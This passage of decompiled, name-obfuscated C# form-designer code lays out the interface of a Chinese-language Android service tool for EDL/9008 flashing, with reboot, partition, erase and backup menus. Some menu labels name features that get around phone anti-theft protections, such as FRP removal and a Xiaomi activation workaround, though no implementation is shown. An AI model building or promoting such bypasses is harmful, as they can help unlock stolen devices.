		this.m_140 = new RichTextBox();
		this.m_157 = new ToolTip((IContainer)this.m_86);
		((Control)this.m_8f).SuspendLayout();
		((Control)this.m_90).SuspendLayout();
		((ISupportInitialize)this.m_143).BeginInit();
		((Control)this.m_99).SuspendLayout();
		((Control)this.m_de).SuspendLayout();
		((Control)this.m_dd).SuspendLayout();
		((Control)this.m_d7).SuspendLayout();
		((Control)this.m_f8).SuspendLayout();
		((Control)this.m_f9).SuspendLayout();
		((Control)this.m_f0).SuspendLayout();
		((Control)this.m_103).SuspendLayout();
		((Control)this.m_104).SuspendLayout();
		((Control)this.m_fb).SuspendLayout();
		((Control)fc).SuspendLayout();
		((Control)fd).SuspendLayout();
		((Control)this.m_fe).SuspendLayout();
		((Control)ff).SuspendLayout();
		((Control)this.m_101).SuspendLayout();
		((Control)this.m_f7).SuspendLayout();
		((Control)this.m_154).SuspendLayout();
		((Control)this.m_155).SuspendLayout();
		((Control)this.m_15d).SuspendLayout();
		((Control)this.m_15e).SuspendLayout();
		((Control)this.m_e5).SuspendLayout();
		((Control)this.m_e6).SuspendLayout();
		((Control)this.m_e8).SuspendLayout();
		((Control)this.m_e9).SuspendLayout();
		((Control)this.m_10f).SuspendLayout();
		((Control)this.m_115).SuspendLayout();
		((Control)this.m_127).SuspendLayout();
		((Control)this.m_128).SuspendLayout();
		((Control)this.m_129).SuspendLayout();
		((Control)this.m_12a).SuspendLayout();
		((Control)this.m_12f).SuspendLayout();
		((Control)this.m_176).SuspendLayout();
		((ISupportInitialize)this.m_16e).BeginInit();
		((Control)this.m_137).SuspendLayout();
		((Control)this.m_136).SuspendLayout();
		((Control)this.m_12b).SuspendLayout();
		((Control)this.m_163).SuspendLayout();
		((Control)this.m_164).SuspendLayout();
		((Control)this).SuspendLayout();
		((TextBoxBase)this.m_87).BorderStyle = BorderStyle.None;
		((Control)this.m_87).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_87).Location = new Point(2007, 85);
		((Control)this.m_87).Name = "richTextBox1";
		((Control)this.m_87).Size = new Size(21, 32);
		((Control)this.m_87).TabIndex = 0;
		((Control)this.m_87).Text = "";
		((Control)this.m_87).Visible = false;
		((Control)_88).BackColor = Color.FromArgb(80, 160, 255);
		((ButtonBase)_88).FlatStyle = FlatStyle.Flat;
		((Control)_88).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)_88).ForeColor = Color.White;
		((Control)_88).Location = new Point(118, 508);
		((Control)_88).Name = "button7";
		((Control)_88).Size = new Size(119, 32);
		((Control)_88).TabIndex = 13;
		((Control)_88).Text = "读取";
		((ButtonBase)_88).UseVisualStyleBackColor = false;
		((Control)_88).Click += a0;
		((Control)this.m_89).BackColor = Color.FromArgb(80, 160, 255);
		((ButtonBase)this.m_89).FlatStyle = FlatStyle.Flat;
		((Control)this.m_89).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_89).ForeColor = Color.White;
		((Control)this.m_89).Location = new Point(243, 507);
		((Control)this.m_89).Name = "button8";
		((Control)this.m_89).Size = new Size(108, 33);
		((Control)this.m_89).TabIndex = 14;
		((Control)this.m_89).Text = "擦除";
		((ButtonBase)this.m_89).UseVisualStyleBackColor = false;
		((Control)this.m_89).Click += _82;
		((ToolStripItem)this.m_8a).BackColor = Color.White;
		((ToolStripDropDownItem)this.m_8a).DropDownItems.AddRange(new ToolStripItem[1] { (ToolStripItem)this.m_8b });
		((ToolStripItem)this.m_8a).Name = "功能ToolStripMenuItem";
		((ToolStripItem)this.m_8a).Size = new Size(44, 21);
		((ToolStripItem)this.m_8a).Text = "功能";
		((ToolStripItem)this.m_8b).Name = "fB重启到EDLToolStripMenuItem";
		((ToolStripItem)this.m_8b).Size = new Size(164, 22);
		((ToolStripItem)this.m_8b).Text = "9008重启到开机";
		((ToolStripItem)this.m_8b).Click += a1;
		((ToolStripDropDownItem)this.m_8c).DropDownItems.AddRange(new ToolStripItem[1] { (ToolStripItem)this.m_8d });
		((ToolStripItem)this.m_8c).Name = "引导功能ToolStripMenuItem";
		((ToolStripItem)this.m_8c).Size = new Size(68, 21);
		((ToolStripItem)this.m_8c).Text = "辅助工具";
		((ToolStripItem)this.m_8d).Name = "加密引导下载ToolStripMenuItem";
		((ToolStripItem)this.m_8d).Size = new Size(136, 22);
		((ToolStripItem)this.m_8d).Text = "设备管理器";
		((ToolStripItem)this.m_8d).Click += _83;
		((Control)this.m_8e).AutoSize = true;
		((Control)this.m_8e).BackColor = Color.White;
		((Control)this.m_8e).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_8e).ForeColor = Color.Cyan;
		((Control)this.m_8e).Location = new Point(11, 21);
		((Control)this.m_8e).Name = "checkBox4";
		((Control)this.m_8e).Size = new Size(15, 14);
		((Control)this.m_8e).TabIndex = 31;
		((ButtonBase)this.m_8e).UseVisualStyleBackColor = false;
		((CheckBox)this.m_8e).CheckedChanged += _84;
		((Control)this.m_8f).Controls.Add((Control)this.m_c8);
		((Control)this.m_8f).Controls.Add((Control)this.m_c9);
		((Control)this.m_8f).Controls.Add((Control)this.m_ca);
		((Control)this.m_8f).Controls.Add((Control)this.m_cb);
		((Control)this.m_8f).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_8f).ForeColor = Color.LightSkyBlue;
		((Control)this.m_8f).Location = new Point(489, 51);
		((Control)this.m_8f).Name = "groupBox1";
		((Control)this.m_8f).Size = new Size(454, 461);
		((Control)this.m_8f).TabIndex = 32;
		((GroupBox)this.m_8f).TabStop = false;
		((Control)this.m_8f).Text = "日志";
		((Control)this.m_c8).BackColor = SystemColors.ButtonHighlight;
		((TextBoxBase)this.m_c8).BorderStyle = BorderStyle.None;
		((Control)this.m_c8).Cursor = Cursors.IBeam;
		((Control)this.m_c8).Font = new Font("微软雅黑", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_c8).ForeColor = Color.Black;
		((Control)this.m_c8).Location = new Point(6, 19);
		((Control)this.m_c8).Name = "richTextBox2";
		((TextBoxBase)this.m_c8).ReadOnly = true;
		((Control)this.m_c8).Size = new Size(442, 436);
		((Control)this.m_c8).TabIndex = 8;
		((Control)this.m_c8).TabStop = false;
		((Control)this.m_c8).Text = "";
		((Control)this.m_c8).TextChanged += _140;
		((Control)this.m_c9).BackColor = Color.White;
		((Control)this.m_c9).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_c9).ForeColor = SystemColors.ControlText;
		((Control)this.m_c9).Location = new Point(285, 162);
		((Control)this.m_c9).Name = "button2";
		((Control)this.m_c9).Size = new Size(65, 25);
		((Control)this.m_c9).TabIndex = 39;
		((Control)this.m_c9).Text = "引导";
		((ButtonBase)this.m_c9).UseVisualStyleBackColor = false;
		((Control)this.m_c9).Click += _1d;
		((Control)this.m_ca).BackColor = Color.WhiteSmoke;
		((TextBoxBase)this.m_ca).BorderStyle = BorderStyle.None;
		((Control)this.m_ca).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_ca).ForeColor = SystemColors.WindowText;
		((Control)this.m_ca).Location = new Point(196, 252);
		((Control)this.m_ca).Name = "richTextBox3";
		((Control)this.m_ca).Size = new Size(137, 23);
		((Control)this.m_ca).TabIndex = 41;
		((Control)this.m_ca).TabStop = false;
		((Control)this.m_ca).Text = "";
		((Control)this.m_ca).Visible = false;
		((Control)this.m_cb).BackColor = Color.White;
		((Control)this.m_cb).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_cb).ForeColor = SystemColors.ControlText;
		((Control)this.m_cb).Location = new Point(285, 202);
		((Control)this.m_cb).Name = "button5";
		((Control)this.m_cb).Size = new Size(65, 26);
		((Control)this.m_cb).TabIndex = 40;
		((Control)this.m_cb).Text = "重启";
		((ButtonBase)this.m_cb).UseVisualStyleBackColor = false;
		((Control)this.m_cb).Click += e8;
		((Control)this.m_bf).AutoSize = true;
		((Control)this.m_bf).Cursor = Cursors.Arrow;
		((Control)this.m_bf).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_bf).ForeColor = Color.DodgerBlue;
		((Control)this.m_bf).Location = new Point(111, 24);
		((Control)this.m_bf).Name = "label6";
		((Control)this.m_bf).Size = new Size(32, 17);
		((Control)this.m_bf).TabIndex = 41;
		((Control)this.m_bf).Text = "进度";
		((Control)this.m_bf).Visible = false;
		((Control)this.m_bf).Click += e0;
		((Control)this.m_90).Controls.Add((Control)this.m_8e);
		((Control)this.m_90).Controls.Add((Control)this.m_143);
		((Control)this.m_90).Controls.Add((Control)this.m_bb);
		((Control)this.m_90).Controls.Add((Control)this.m_c4);
		((Control)this.m_90).Controls.Add((Control)this.m_c6);
		((Control)this.m_90).Controls.Add((Control)this.m_eb);
		((Control)this.m_90).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_90).ForeColor = Color.DodgerBlue;
		((Control)this.m_90).Location = new Point(9, 161);
		((Control)this.m_90).Name = "groupBox3";
		((Control)this.m_90).Size = new Size(464, 310);
		((Control)this.m_90).TabIndex = 34;
		((GroupBox)this.m_90).TabStop = false;
		((Control)this.m_90).Text = "分区表";
		((Control)this.m_90).Enter += _9f;
		((DataGridView)this.m_143).AllowUserToAddRows = false;
		((DataGridView)this.m_143).AllowUserToDeleteRows = false;
		((DataGridView)this.m_143).BackgroundColor = Color.White;
		((DataGridView)this.m_143).BorderStyle = BorderStyle.None;
		((DataGridView)this.m_143).ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		((DataGridView)this.m_143).Columns.AddRange((DataGridViewColumn)this.m_144, (DataGridViewColumn)this.m_145, (DataGridViewColumn)this.m_146, (DataGridViewColumn)this.m_147, (DataGridViewColumn)this.m_148, (DataGridViewColumn)this.m_149, (DataGridViewColumn)this.m_14a, (DataGridViewColumn)this.m_14b, (DataGridViewColumn)this.m_14c);
		((Control)this.m_143).Location = new Point(5, 15);
		((Control)this.m_143).Name = "dataGridView1";
		((DataGridView)this.m_143).RowHeadersVisible = false;
		((DataGridView)this.m_143).RowTemplate.Height = 23;
		((Control)this.m_143).Size = new Size(451, 289);
		((Control)this.m_143).TabIndex = 56;
		((DataGridView)this.m_143).CellDoubleClick += _187;
		((DataGridView)this.m_143).CellValueChanged += _18a;
		((Control)this.m_143).MouseLeave += _188;
		((DataGridViewColumn)this.m_144).HeaderText = "";
		((DataGridViewColumn)this.m_144).Name = "Check";
		((DataGridViewBand)this.m_144).Resizable = DataGridViewTriState.False;
		((DataGridViewColumn)this.m_144).Width = 25;
		((DataGridViewColumn)this.m_145).HeaderText = "";
		((DataGridViewColumn)this.m_145).Name = "L";
		((DataGridViewColumn)this.m_145).Width = 25;
		((DataGridViewColumn)this.m_146).HeaderText = "Partition";
		((DataGridViewColumn)this.m_146).Name = "name";
		((DataGridViewBand)this.m_146).ReadOnly = true;
		((DataGridViewColumn)this.m_147).HeaderText = "Filename";
		((DataGridViewColumn)this.m_147).Name = "filename";
		((DataGridViewBand)this.m_147).ReadOnly = true;
		((DataGridViewColumn)this.m_147).Width = 120;
		((DataGridViewColumn)this.m_148).HeaderText = "star";
		((DataGridViewColumn)this.m_148).Name = "star";
		((DataGridViewBand)this.m_148).ReadOnly = true;
		((DataGridViewBand)this.m_148).Visible = false;
		((DataGridViewColumn)this.m_149).HeaderText = "Num";
		((DataGridViewColumn)this.m_149).Name = "num";
		((DataGridViewBand)this.m_149).ReadOnly = true;
		((DataGridViewBand)this.m_149).Visible = false;
		((DataGridViewColumn)this.m_14a).HeaderText = "Size";
		((DataGridViewColumn)this.m_14a).Name = "Size";
		((DataGridViewBand)this.m_14a).ReadOnly = true;
		((DataGridViewColumn)this.m_14a).Width = 80;
		((DataGridViewColumn)this.m_14b).HeaderText = "Hex";
		((DataGridViewColumn)this.m_14b).Name = "Hex";
		((DataGridViewBand)this.m_14b).ReadOnly = true;
		((DataGridViewColumn)this.m_14b).Width = 85;
		((DataGridViewColumn)this.m_14c).HeaderText = "FilePath";
		((DataGridViewColumn)this.m_14c).Name = "filepath";
		((DataGridViewBand)this.m_14c).ReadOnly = true;
		((DataGridViewColumn)this.m_14c).Width = 500;
		((Control)this.m_bb).Location = new Point(23, 64);
		((Control)this.m_bb).Name = "richTextBox4";
		((Control)this.m_bb).Size = new Size(405, 213);
		((Control)this.m_bb).TabIndex = 34;
		((Control)this.m_bb).Text = "";
		((Control)this.m_c4).Cursor = Cursors.WaitCursor;
		((Control)this.m_c4).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_c4).Location = new Point(10, 233);
		((Control)this.m_c4).Margin = new Padding(4, 5, 4, 5);
		((Control)this.m_c4).MinimumSize = new Size(1, 16);
		((Control)this.m_c4).Name = "textBox5";
		((Control)this.m_c4).Padding = new Padding(5);
		((UIUserControl)this.m_c4).RectColor = Color.Silver;
		((UIPanel)this.m_c4).ShowText = false;
		((Control)this.m_c4).Size = new Size(382, 23);
		((Control)this.m_c4).TabIndex = 54;
		((UIUserControl)this.m_c4).TextAlignment = ContentAlignment.MiddleLeft;
		((Control)this.m_c4).Visible = false;
		((UITextBox)this.m_c4).Watermark = "Patch";
		((Control)this.m_c6).BackColor = Color.LightSkyBlue;
		((ButtonBase)this.m_c6).FlatStyle = FlatStyle.Flat;
		((Control)this.m_c6).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_c6).ForeColor = Color.White;
		((Control)this.m_c6).Location = new Point(359, 252);
		((Control)this.m_c6).Name = "button4";
		((Control)this.m_c6).Size = new Size(76, 25);
		((Control)this.m_c6).TabIndex = 52;
		((Control)this.m_c6).Text = "浏览";
		((ButtonBase)this.m_c6).UseVisualStyleBackColor = false;
		((Control)this.m_c6).Visible = false;
		((Control)this.m_c6).Click += e4;
		((Control)this.m_eb).AutoSize = true;
		((Control)this.m_eb).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_eb).ForeColor = Color.DodgerBlue;
		((Control)this.m_eb).Location = new Point(375, 76);
		((Control)this.m_eb).Name = "label7";
		((Control)this.m_eb).Size = new Size(38, 17);
		((Control)this.m_eb).TabIndex = 55;
		((Control)this.m_eb).Text = "timer";
		((Control)this.m_eb).Visible = false;
		((Control)this.m_91).BackColor = Color.White;
		((Control)this.m_91).Cursor = Cursors.IBeam;
		((ComboBox)this.m_91).FlatStyle = FlatStyle.Flat;
		((Control)this.m_91).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_91).ForeColor = Color.Gray;
		((ListControl)this.m_91).FormattingEnabled = true;
		((Control)this.m_91).Location = new Point(386, 477);
		((Control)this.m_91).Name = "comboBox1";
		((Control)this.m_91).Size = new Size(87, 25);
		((Control)this.m_91).TabIndex = 32;
		((Control)this.m_91).Text = "查找单分区";
		((ComboBox)this.m_91).SelectedIndexChanged += _87;
		((ComboBox)this.m_91).SelectionChangeCommitted += _86;
		((Control)this.m_91).TextChanged += _85;
		((Control)this.m_91).Enter += cd;
		((Control)this.m_91).KeyDown += _18e;
		((Control)this.m_91).Leave += ce;
		((Control)this.m_c2).BackColor = Color.FromArgb(80, 160, 255);
		((ButtonBase)this.m_c2).FlatStyle = FlatStyle.Flat;
		((Control)this.m_c2).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_c2).ForeColor = Color.White;
		((Control)this.m_c2).Location = new Point(6, 509);
		((Control)this.m_c2).Name = "button9";
		((Control)this.m_c2).Size = new Size(106, 30);
		((Control)this.m_c2).TabIndex = 33;
		((Control)this.m_c2).Text = "读分区表";
		((ButtonBase)this.m_c2).UseVisualStyleBackColor = false;
		((Control)this.m_c2).Click += _8c;
		((Control)this.m_92).AutoSize = true;
		((Control)this.m_92).Font = new Font("微软雅黑", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
		((Control)this.m_92).ForeColor = Color.DodgerBlue;
		((Control)this.m_92).Location = new Point(44, 87);
		((Control)this.m_92).Name = "Lbl登录成功的账号";
		((Control)this.m_92).Size = new Size(35, 17);
		((Control)this.m_92).TabIndex = 38;
		((Control)this.m_92).Text = "User";
		((Control)this.m_92).Click += b5;
		((ToolStripItem)this.m_93).BackColor = Color.White;
		((ToolStripItem)this.m_93).Name = "toolStripMenuItem1";
		((ToolStripItem)this.m_93).Size = new Size(44, 21);
		((ToolStripItem)this.m_93).Text = "功能";
		((ToolStripItem)this.m_94).Name = "toolStripMenuItem2";
		((ToolStripItem)this.m_94).Size = new Size(180, 22);
		((ToolStripItem)this.m_94).Text = "9008重启到开机";
		((ToolStripItem)this.m_94).Click += a2;
		((ToolStripItem)this.m_95).Name = "toolStripMenuItem3";
		((ToolStripItem)this.m_95).Size = new Size(68, 21);
		((ToolStripItem)this.m_95).Text = "辅助工具";
		((ToolStripItem)_96).Name = "toolStripMenuItem4";
		((ToolStripItem)_96).Size = new Size(180, 22);
		((ToolStripItem)_96).Text = "设备管理器";
		((ToolStripItem)this.m_97).BackColor = Color.White;
		((ToolStripDropDownItem)this.m_97).DropDownItems.AddRange(new ToolStripItem[1] { (ToolStripItem)this.m_98 });
		((ToolStripItem)this.m_97).Name = "toolStripMenuItem5";
		((ToolStripItem)this.m_97).Size = new Size(44, 21);
		((ToolStripItem)this.m_97).Text = "功能";
		((ToolStripItem)this.m_98).Name = "toolStripMenuItem6";
		((ToolStripItem)this.m_98).Size = new Size(164, 22);
		((ToolStripItem)this.m_98).Text = "9008重启到开机";
		((ToolStrip)this.m_99).BackColor = Color.White;
		((ToolStrip)this.m_99).ImageScalingSize = new Size(20, 20);
		((ToolStrip)this.m_99).Items.AddRange(new ToolStripItem[3]
		{
			(ToolStripItem)this.m_ab,
			(ToolStripItem)this.m_b1,
			(ToolStripItem)this.m_b3
		});
		((Control)this.m_99).Location = new Point(0, 29);
		((Control)this.m_99).Name = "menuStrip1";
		((Control)this.m_99).Padding = new Padding(4, 2, 0, 2);
		((Control)this.m_99).Size = new Size(953, 25);
		((Control)this.m_99).TabIndex = 39;
		((Control)this.m_99).Text = "menuStrip1";
		((ToolStrip)this.m_99).ItemClicked += _128;
		((ToolStripDropDownItem)this.m_ab).DropDownItems.AddRange(new ToolStripItem[12]
		{
			(ToolStripItem)this.m_ac,
			(ToolStripItem)this.m_ad,
			(ToolStripItem)this.m_ae,
			(ToolStripItem)this.m_af,
			(ToolStripItem)this.m_b0,
			(ToolStripItem)this.m_e3,
			(ToolStripItem)this.m_150,
			(ToolStripItem)this.m_123,
			(ToolStripItem)this.m_153,
			(ToolStripItem)this.m_141,
			(ToolStripItem)this.m_152,
			(ToolStripItem)this.m_151
		});
		((ToolStripItem)this.m_ab).ForeColor = Color.CornflowerBlue;
		((ToolStripItem)this.m_ab).Name = "fB功能ToolStripMenuItem1";
		((ToolStripItem)this.m_ab).Size = new Size(68, 21);
		((ToolStripItem)this.m_ab).Text = "快捷功能";
		((ToolStripItem)this.m_ac).ForeColor = Color.CornflowerBlue;
		((ToolStripItem)this.m_ac).Image = (Image)componentResourceManager.GetObject("重启到开机ToolStripMenuItem1.Image");
		((ToolStripItem)this.m_ac).Name = "重启到开机ToolStripMenuItem1";
		((ToolStripItem)this.m_ac).Size = new Size(164, 26);
		((ToolStripItem)this.m_ac).Text = "重启系统";
		((ToolStripItem)this.m_ac).Click += ab;
		((ToolStripItem)this.m_ad).ForeColor = Color.CornflowerBlue;
		((ToolStripItem)this.m_ad).Image = (Image)componentResourceManager.GetObject("重启到bootloaderToolStripMenuItem3.Image");
		((ToolStripItem)this.m_ad).Name = "重启到bootloaderToolStripMenuItem3";
		((ToolStripItem)this.m_ad).Size = new Size(164, 26);
		((ToolStripItem)this.m_ad).Text = "重启FB";
		((ToolStripItem)this.m_ad).Click += ac;
		((ToolStripItem)this.m_ae).ForeColor = Color.CornflowerBlue;
		((ToolStripItem)this.m_ae).Image = (Image)componentResourceManager.GetObject("重启到fastbootdToolStripMenuItem3.Image");
		((ToolStripItem)this.m_ae).Name = "重启到fastbootdToolStripMenuItem3";
		((ToolStripItem)this.m_ae).Size = new Size(164, 26);
		((ToolStripItem)this.m_ae).Text = "重启FBD";
		((ToolStripItem)this.m_ae).Click += ad;
		((ToolStripItem)this.m_af).ForeColor = Color.CornflowerBlue;
		((ToolStripItem)this.m_af).Image = (Image)componentResourceManager.GetObject("重启到recoveryToolStripMenuItem3.Image");
		((ToolStripItem)this.m_af).Name = "重启到recoveryToolStripMenuItem3";
		((ToolStripItem)this.m_af).Size = new Size(164, 26);
		((ToolStripItem)this.m_af).Text = "重启REC";
		((ToolStripItem)this.m_af).Click += ae;
		((ToolStripItem)this.m_b0).ForeColor = Color.CornflowerBlue;
		((ToolStripItem)this.m_b0).Image = (Image)componentResourceManager.GetObject("重启到edlToolStripMenuItem2.Image");
		((ToolStripItem)this.m_b0).Name = "重启到edlToolStripMenuItem2";
		((ToolStripItem)this.m_b0).Size = new Size(164, 26);
		((ToolStripItem)this.m_b0).Text = "重启EDL";
		((ToolStripItem)this.m_b0).Click += af;
		((ToolStripItem)this.m_e3).ForeColor = Color.CornflowerBlue;
		((ToolStripItem)this.m_e3).Image = (Image)componentResourceManager.GetObject("重启到EDL联想ToolStripMenuItem.Image");
		((ToolStripItem)this.m_e3).Name = "重启到EDL联想ToolStripMenuItem";
		((ToolStripItem)this.m_e3).Size = new Size(164, 26);
		((ToolStripItem)this.m_e3).Text = "重启EDL联想";
		((ToolStripItem)this.m_e3).Click += _132;
		((ToolStripItem)this.m_150).ForeColor = Color.CornflowerBlue;
		((ToolStripItem)this.m_150).Image = (Image)componentResourceManager.GetObject("重启到小米助手ToolStripMenuItem.Image");
		((ToolStripItem)this.m_150).Name = "重启到小米助手ToolStripMenuItem";
		((ToolStripItem)this.m_150).Size = new Size(164, 26);
		((ToolStripItem)this.m_150).Text = "重启到小米助手";
		((ToolStripItem)this.m_150).Click += _18f;
		((ToolStripItem)this.m_123).ForeColor = Color.CornflowerBlue;
		((ToolStripItem)this.m_123).Image = (Image)componentResourceManager.GetObject("切换启动槽AToolStripMenuItem.Image");
		((ToolStripItem)this.m_123).Name = "切换启动槽AToolStripMenuItem";
		((ToolStripItem)this.m_123).Size = new Size(164, 26);
		((ToolStripItem)this.m_123).Text = "切换插槽";
		((ToolStripItem)this.m_123).Click += _158;
		((ToolStripItem)this.m_153).ForeColor = Color.CornflowerBlue;
		((ToolStripItem)this.m_153).Image = (Image)componentResourceManager.GetObject("移除FRPToolStripMenuItem.Image");
		((ToolStripItem)this.m_153).Name = "移除FRPToolStripMenuItem";
		((ToolStripItem)this.m_153).Size = new Size(164, 26);
		((ToolStripItem)this.m_153).Text = "移除FRP";
		((ToolStripItem)this.m_153).Click += _195;
		((ToolStripItem)this.m_141).ForeColor = Color.CornflowerBlue;
		((ToolStripItem)this.m_141).Image = (Image)componentResourceManager.GetObject("mI改制设备ToolStripMenuItem.Image");
		((ToolStripItem)this.m_141).Name = "mI改制设备ToolStripMenuItem";
		((ToolStripItem)this.m_141).Size = new Size(164, 26);
		((ToolStripItem)this.m_141).Text = "MI 改制设备";
		((ToolStripItem)this.m_141).Click += _184;
		((ToolStripItem)this.m_152).ForeColor = Color.CornflowerBlue;
		((ToolStripItem)this.m_152).Image = (Image)componentResourceManager.GetObject("强开USB安全ToolStripMenuItem.Image");
		((ToolStripItem)this.m_152).Name = "强开USB安全ToolStripMenuItem";
		((ToolStripItem)this.m_152).Size = new Size(164, 26);
		((ToolStripItem)this.m_152).Text = "强开USB安全";
		((ToolStripItem)this.m_152).Click += _193;
		((ToolStripItem)this.m_151).ForeColor = Color.CornflowerBlue;
		((ToolStripItem)this.m_151).Image = (Image)componentResourceManager.GetObject("快捷投屏ToolStripMenuItem.Image");
		((ToolStripItem)this.m_151).Name = "快捷投屏ToolStripMenuItem";
		((ToolStripItem)this.m_151).Size = new Size(164, 26);
		((ToolStripItem)this.m_151).Text = "快捷投屏";
		((ToolStripItem)this.m_151).Click += _191;
		((ToolStripDropDownItem)this.m_b1).DropDownItems.AddRange(new ToolStripItem[12]
		{
			(ToolStripItem)this.m_b2,
			(ToolStripItem)this.m_b6,
			(ToolStripItem)this.m_b7,
			(ToolStripItem)this.m_b8,
			(ToolStripItem)this.m_b9,
			(ToolStripItem)this.m_12e,
			(ToolStripItem)this.m_ba,
			(ToolStripItem)this.m_bc,
			(ToolStripItem)this.m_bd,
			(ToolStripItem)this.m_13c,
			(ToolStripItem)this.m_13d,
			(ToolStripItem)_13e
		});
		((ToolStripItem)this.m_b1).ForeColor = Color.CornflowerBlue;
		((ToolStripItem)this.m_b1).Name = "eDL功能ToolStripMenuItem";
		((ToolStripItem)this.m_b1).Size = new Size(66, 21);
		((ToolStripItem)this.m_b1).Text = "EDL功能";
		((ToolStripItem)this.m_b2).ForeColor = Color.CornflowerBlue;
		((ToolStripItem)this.m_b2).Image = (Image)componentResourceManager.GetObject("重启到开机ToolStripMenuItem2.Image");
		((ToolStripItem)this.m_b2).Name = "重启到开机ToolStripMenuItem2";
		((ToolStripItem)this.m_b2).Size = new Size(152, 26);
		((ToolStripItem)this.m_b2).Text = "EDl重启系统";
		((ToolStripItem)this.m_b2).Click += b4;
		((ToolStripItem)this.m_b6).ForeColor = Color.CornflowerBlue;
		((ToolStripItem)this.m_b6).Image = (Image)componentResourceManager.GetObject("eDL重启到EDlToolStripMenuItem.Image");
		((ToolStripItem)this.m_b6).Name = "eDL重启到EDlToolStripMenuItem";
		((ToolStripItem)this.m_b6).Size = new Size(152, 26);
		((ToolStripItem)this.m_b6).Text = "EDL重启EDL";
		((ToolStripItem)this.m_b6).Click += b6;
		((ToolStripItem)this.m_b7).ForeColor = Color.CornflowerBlue;
		((ToolStripItem)this.m_b7).Image = (Image)componentResourceManager.GetObject("eDl重启到RECToolStripMenuItem.Image");
		((ToolStripItem)this.m_b7).Name = "eDl重启到RECToolStripMenuItem";
		((ToolStripItem)this.m_b7).Size = new Size(152, 26);
		((ToolStripItem)this.m_b7).Text = "EDL重启REC";
		((ToolStripItem)this.m_b7).Click += ba;
		((ToolStripItem)this.m_b8).ForeColor = Color.CornflowerBlue;
		((ToolStripItem)this.m_b8).Image = (Image)componentResourceManager.GetObject("eDL重启到fastbootDToolStripMenuItem.Image");
		((ToolStripItem)this.m_b8).Name = "eDL重启到fastbootDToolStripMenuItem";
		((ToolStripItem)this.m_b8).Size = new Size(152, 26);
		((ToolStripItem)this.m_b8).Text = "EDL重启FBD";
		((ToolStripItem)this.m_b8).Click += bd;
		((ToolStripItem)this.m_b9).ForeColor = Color.CornflowerBlue;
		((ToolStripItem)this.m_b9).Image = (Image)componentResourceManager.GetObject("eDL恢复出厂ToolStripMenuItem.Image");
		((ToolStripItem)this.m_b9).Name = "eDL恢复出厂ToolStripMenuItem";
		((ToolStripItem)this.m_b9).Size = new Size(152, 26);
		((ToolStripItem)this.m_b9).Text = "EDL恢复出厂";
		((ToolStripItem)this.m_b9).Click += c1;
		((ToolStripItem)this.m_12e).ForeColor = Color.CornflowerBlue;
		((ToolStripItem)this.m_12e).Image = (Image)componentResourceManager.GetObject("魅族恢复出厂ToolStripMenuItem.Image");
		((ToolStripItem)this.m_12e).Name = "魅族恢复出厂ToolStripMenuItem";
		((ToolStripItem)this.m_12e).Size = new Size(152, 26);
		((ToolStripItem)this.m_12e).Text = "魅族恢复出厂";
		((ToolStripItem)this.m_12e).Click += _166;
		((ToolStripItem)this.m_ba).ForeColor = Color.CornflowerBlue;
		((ToolStripItem)this.m_ba).Image = (Image)componentResourceManager.GetObject("小米ACCToolStripMenuItem.Image");
		((ToolStripItem)this.m_ba).Name = "小米ACCToolStripMenuItem";
		((ToolStripItem)this.m_ba).Size = new Size(152, 26);
		((ToolStripItem)this.m_ba).Text = "MI 无法激活";
		((ToolStripItem)this.m_ba).Click += c4;
		((ToolStripItem)this.m_bc).ForeColor = Color.CornflowerBlue;
		((ToolStripItem)this.m_bc).Image = (Image)componentResourceManager.GetObject("备份基带ToolStripMenuItem.Image");
		((ToolStripItem)this.m_bc).Name = "备份基带ToolStripMenuItem";
		((ToolStripItem)this.m_bc).Size = new Size(152, 26);
		((ToolStripItem)this.m_bc).Text = "备份基带";
		((ToolStripItem)this.m_bc).Click += d0;
		((ToolStripItem)this.m_bd).ForeColor = Color.CornflowerBlue;
		((ToolStripItem)this.m_bd).Image = (Image)componentResourceManager.GetObject("backUPmodemEraseToolStripMenuItem.Image");
		((ToolStripItem)this.m_bd).Name = "backUPmodemEraseToolStripMenuItem";
		((ToolStripItem)this.m_bd).Size = new Size(152, 26);
		((ToolStripItem)this.m_bd).Text = "云端擦除";
		((ToolStripItem)this.m_bd).Click += d6;
		((ToolStripItem)this.m_13c).ForeColor = Color.CornflowerBlue;
		((ToolStripItem)this.m_13c).Image = (Image)componentResourceManager.GetObject("擦除磁盘ToolStripMenuItem.Image");
		((ToolStripItem)this.m_13c).Name = "擦除磁盘ToolStripMenuItem";
		((ToolStripItem)this.m_13c).Size = new Size(152, 26);
		((ToolStripItem)this.m_13c).Text = "擦除磁盘";
		((ToolStripItem)this.m_13c).Click += _17e;
		((ToolStripItem)this.m_13d).ForeColor = Color.CornflowerBlue;
		((ToolStripItem)this.m_13d).Image = (Image)componentResourceManager.GetObject("修复分区表ToolStripMenuItem.Image");
